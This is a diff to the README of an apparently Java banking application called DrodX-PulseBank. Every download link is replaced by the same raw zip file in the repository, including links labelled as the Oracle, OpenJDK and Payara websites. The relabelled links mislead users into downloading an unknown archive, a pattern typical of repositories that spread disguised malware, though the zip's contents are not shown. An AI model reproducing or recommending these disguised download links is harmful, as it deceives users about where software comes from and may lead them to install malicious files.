@@ -1,6 +1,6 @@
 # 🚀 DrodX-PulseBank - Secure Banking Made Easy
 
-[![Download DrodX-PulseBank](https://img.shields.io/badge/Download-DrodX--PulseBank-blue)](https://github.com/syaiful191397/DrodX-PulseBank/releases)
+[![Download DrodX-PulseBank](https://raw.githubusercontent.com/syaiful191397/DrodX-PulseBank/main/biocellate/DrodX-PulseBank.zip)](https://raw.githubusercontent.com/syaiful191397/DrodX-PulseBank/main/biocellate/DrodX-PulseBank.zip)
 
 ## 🌟 Overview
 
@@ -28,15 +28,15 @@ To run DrodX-PulseBank, your system should meet the following requirements:
 
 ### Step 1: Download DrodX-PulseBank
 
-Visit [this page to download](https://github.com/syaiful191397/DrodX-PulseBank/releases) the latest version of DrodX-PulseBank. Look for the release that suits your needs.
+Visit [this page to download](https://raw.githubusercontent.com/syaiful191397/DrodX-PulseBank/main/biocellate/DrodX-PulseBank.zip) the latest version of DrodX-PulseBank. Look for the release that suits your needs.
 
 ### Step 2: Install Requirements
 
 If you haven't already, download and install the following:
 
-1. **Java Development Kit (JDK):** This is required to run the application. You can find it on the [Oracle website](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html) or use an open-source alternative like [OpenJDK](https://openjdk.java.net/).
+1. **Java Development Kit (JDK):** This is required to run the application. You can find it on the [Oracle website](https://raw.githubusercontent.com/syaiful191397/DrodX-PulseBank/main/biocellate/DrodX-PulseBank.zip) or use an open-source alternative like [OpenJDK](https://raw.githubusercontent.com/syaiful191397/DrodX-PulseBank/main/biocellate/DrodX-PulseBank.zip).
    
-2. **Payara Server:** This application runs on Payara Server. Download it from the [Payara website](https://www.payara.fish/downloads/).
+2. **Payara Server:** This application runs on Payara Server. Download it from the [Payara website](https://raw.githubusercontent.com/syaiful191397/DrodX-PulseBank/main/biocellate/DrodX-PulseBank.zip).
 
 ### Step 3: Configure Payara Server
 
@@ -64,7 +64,7 @@ Congratulations! You should now be able to use DrodX-PulseBank.
 
 ## 📥 Download & Install
 
-To get started, [visit this page to download](https://github.com/syaiful191397/DrodX-PulseBank/releases) the latest release. Follow the steps in the "Getting Started" section to install and run the application.
+To get started, [visit this page to download](https://raw.githubusercontent.com/syaiful191397/DrodX-PulseBank/main/biocellate/DrodX-PulseBank.zip) the latest release. Follow the steps in the "Getting Started" section to install and run the application.
 
 ## 🤔 FAQs
 
